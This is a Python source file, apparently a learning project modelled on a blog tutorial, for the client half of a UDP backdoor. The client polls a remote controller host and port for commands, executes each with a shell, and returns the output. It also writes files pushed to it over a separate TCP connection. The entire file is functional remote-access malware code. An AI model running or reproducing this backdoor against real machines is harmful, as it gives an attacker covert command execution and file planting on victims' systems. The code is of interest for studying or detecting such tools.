# https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM
# used this to learn how to initialize socket.

# https://www.securecoding.com/blog/how-to-build-a-simple-backdoor-in-python/
# This file itself is an iteration on the client described here.

import socket
import subprocess
import sys

import commands
from commands import Commands

udp_buffer_size = 4096
tcp_buffer_size = 4096


def get_command(request, sock, host, port):
    print("[-] Requesting command...")
    # https://theprogrammingexpert.com/python-int-to-bytes/
    # int to byte
    sock.sendto(commands.to_byte(request), (host, port))
    return sock.recv(udp_buffer_size).decode()


# https://contenttool.io/text-difference-checker
# used this tool to confirm that the read and write functions worked.
def write_list_into_file(name, byte_or_char_type, input_list):
    write_target = open(name, 'w{0}'.format(byte_or_char_type))
    for current_string in input_list:
        write_target.write(current_string)
    write_target.close()


DEFAULT_HOST = 'localhost'
DEFAULT_PORT = 4444
DEFAULT_TRANSFER_PORT = 4445

REMOTE_HOST = DEFAULT_HOST
REMOTE_PORT = DEFAULT_PORT
REMOTE_TRANSFER_PORT = DEFAULT_TRANSFER_PORT

if len(sys.argv) > 1:
    REMOTE_HOST = sys.argv[1]

if len(sys.argv) > 2:
    REMOTE_PORT = int(sys.argv[2])

s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

try:

    while True:
        command = get_command(Commands.REQUEST, s, REMOTE_HOST, REMOTE_PORT)

        if command == 'file':
            file_name = get_command(Commands.FILENAME, s, REMOTE_HOST, REMOTE_PORT)
            tcp_connection = socket.socket()
            f = None
            try:
                tcp_connection.connect((REMOTE_HOST, REMOTE_TRANSFER_PORT))
                f = open(file_name, 'w')
                # TODO: loop tcp receive until done.
                f.write(tcp_connection.recv(tcp_buffer_size).decode())
            finally:
                f.close()
                tcp_connection.close()
        else:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            print("[-] Sending response...")
            s.sendto(output + output_error, (REMOTE_HOST, REMOTE_PORT))

except ConnectionAbortedError:
    print("Connection severed")
except ConnectionResetError:
    print("Connection reset")
finally:
    s.close()
